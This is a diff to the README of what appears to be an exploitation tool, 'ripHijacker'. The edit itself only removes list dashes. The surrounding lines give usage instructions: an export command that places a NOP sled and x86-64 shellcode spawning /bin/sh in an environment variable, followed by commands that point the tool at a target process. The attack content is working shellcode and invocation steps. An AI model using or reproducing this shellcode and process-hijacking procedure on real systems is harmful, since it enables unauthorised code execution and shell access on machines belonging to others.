@@ -30,13 +30,13 @@ $./ripHijacker [OPTIONS]
  $./ripHijacker -p 6666 -z 1
  ````
  
- - We can load a simple /bin/sh shellcode in an environment variable with the comand:
+ We can load a simple /bin/sh shellcode in an environment variable with the comand:
  ```bash
  
  export A=$(python -c "print '\x90' * 20 + '\xeb\x1f\x5f\x48\x31\xc0\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'")
  ```
  
-- Now we can use -e and -n options:
+Now we can use -e and -n options:
 
  ```bash
  $./ripHijacker -p 6666 -z 1 -e A -n target_name
